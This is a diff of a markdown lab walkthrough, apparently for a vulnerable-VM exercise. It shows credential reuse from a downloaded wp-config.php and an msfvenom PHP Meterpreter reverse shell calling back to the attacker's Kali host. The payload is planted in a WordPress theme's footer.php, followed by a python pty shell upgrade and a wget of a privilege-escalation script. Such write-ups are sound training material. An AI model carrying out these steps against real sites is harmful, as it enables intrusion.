@@ -77,19 +77,19 @@ No problem listing directories or files.
 ![Image of SMBClient2](https://blu0.github.io/LSAWalkthrough/LSAsmbclient2.png)
 
 
-The `get` command works, so grabbed the wp-config.php file and viewed it on my system.
+The `get` command works, so I grabbed the wp-config.php file and viewed it on my system.
 
 ![Image of wp-config](https://blu0.github.io/LSAWalkthrough/LSAwp-config.png)
 
-Trying the password found in the WordPress Admin panel and what do you know, the password works.
+Trying the password found in the `wp-config.php` file in the WordPress admin panel and what do you know, the password works.
 
-Now it's time for time get a quick reverse shell on the machine. To do this I will generate a Meterpreter shell using the following command:
+Now it's time for time get a quick reverse shell on the machine. To do this I will generate a Meterpreter shell using the following command (.141 is the Kali machine):
 
 `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.17.141 LPORT=4444 -f raw > shell.php`
 
 Note: Meterpreter is not really needed, I could have tried any number of php reverse shells, but I wanted the meterpreter one for the `shell` command so that if I do something to botch my shell I can simply end the session instead of havnig to reconnect entirely.
 
-Once the shellcode is generated, I do a little touch up on the format (remove leading `//` and add `?>` to the end), then add to footer.php of theme.
+Once the shellcode is generated, I do a little touch up on the format (remove leading `//` and add `?>` to the end), then add to footer.php of the Wordpress theme.
 
 ![Image of footer](https://blu0.github.io/LSAWalkthrough/LSAfooter.png)
 
@@ -101,11 +101,11 @@ Now type run and reload the wordpress site.
 
 ![Image of meterpreter2](https://blu0.github.io/LSAWalkthrough/LSAmeterpreter2.png)
 
-The reverse shell is successful, getting some system info.
+The reverse shell is successful, so I check what directory I'm in, use the `shell` command, get my TTY shell with python using `python -c 'import pty; pty.spawn("/bin/sh")'`, and get some basic system info.
 
-I tried the WordPress password for root, but it isn't working.
+I tried the WordPress password to switch to root, but that's too easy and of course it doesn't work.
 
-Moved to /tmp and did a quick wget from my attack machine (ensure apache is running on Kali) to download the linuxprivchecker.py script. Ran it, but found nothing obvious. I'll poke around some more with what I already have and come back to it if I get stuck.
+Moved to /tmp and did a quick wget from my attack machine (ensure apache is running on Kali) to download the [linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) script. Ran it, but found nothing too obvious at first glance. I'll poke around some more with what I already have and come back to it if I get stuck.
 
 Maybe there is another user in the database or another database.
 
